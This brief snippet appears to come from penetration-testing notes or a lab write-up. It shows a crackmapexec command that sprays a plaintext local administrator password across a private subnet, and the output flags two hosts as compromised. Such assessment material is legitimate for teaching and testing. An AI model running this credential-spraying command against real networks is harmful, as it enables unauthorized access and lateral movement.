Confirming local admin password reuse in the 172.16.5.0/24 subnet

```$crackmapexec smb 172.16.5.0/24 --local-auth -u administrator -p 'Welcome123!' | grep +

SMB         172.16.5.130    445    FILE01           [+] FILE01\administrator:Welcome123! (Pwn3d!)
SMB         172.16.5.200    445    DEV01            [+] DEV01\administrator:Welcome123! (Pwn3d!)